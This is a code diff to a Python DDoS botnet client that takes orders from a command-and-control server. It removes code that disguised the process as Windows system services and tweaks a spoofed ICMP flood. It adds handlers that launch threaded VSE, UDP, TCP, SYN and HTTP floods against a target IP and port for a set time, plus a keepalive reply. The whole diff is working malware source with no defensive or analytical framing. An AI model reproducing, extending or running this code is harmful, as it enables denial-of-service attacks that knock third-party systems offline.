@@ -16,15 +16,6 @@ import platform
 C2_ADDRESS  = '127.0.0.1'
 C2_PORT     = 80
 
-TITLE_LIST = ["Registry", "Windows Session Manager", "Windows Start-Up Application", "Windows Logon Application", "System", "Shell Infrastructure Host", "Services and Controller App"]
-NOTE = "Test client" #The note returned with the bots command, is nice for seeing who go infected by what.
-ID = 0 #Keep this as 0 at all times, this should never be modified or removed
-
-TITLE = random.choice(TITLE_LIST)
-
-setproctitle.setproctitle(TITLE)
-setproctitle.setthreadtitle(TITLE)
-
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -99,7 +90,7 @@ def main():
                 ip_sent, packets_to_send = command.split("||")
                 source_ip = requests.get("https://checkip.amazonaws.com").text.strip()
                 target_ip = ip_sent
-                message = "Love you <3"
+                message = "T"
                 packets = packets_to_send
 
                 TheBigD = IP(src=source_ip, dst=target_ip)/ICMP()/(message*60000)
@@ -108,6 +99,59 @@ def main():
                         send(packets*TheBigD)
                     except:
                         break
+
+            elif command == '.VSE':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+
+                for _ in range(threads):
+                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
+
+            elif command == '.UDP':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                size = int(args[4])
+                threads = int(args[5])
+
+                for _ in range(threads):
+                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
+
+            elif command == '.TCP':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                size = int(args[4])
+                threads = int(args[5])
+
+                for _ in range(threads):
+                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
+
+            elif command == '.SYN':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
+
+                for _ in range(threads):
+                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
+
+            elif command == '.HTTP':
+                ip = args[1]
+                secs = time.time() + int(args[2])
+                threads = int(args[3])
+
+                for _ in range(threads):
+                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
+
+            elif command == 'PING':
+                c2.send('PONG'.encode())
+
+
+            else:
+                pass
         except:
             break
 
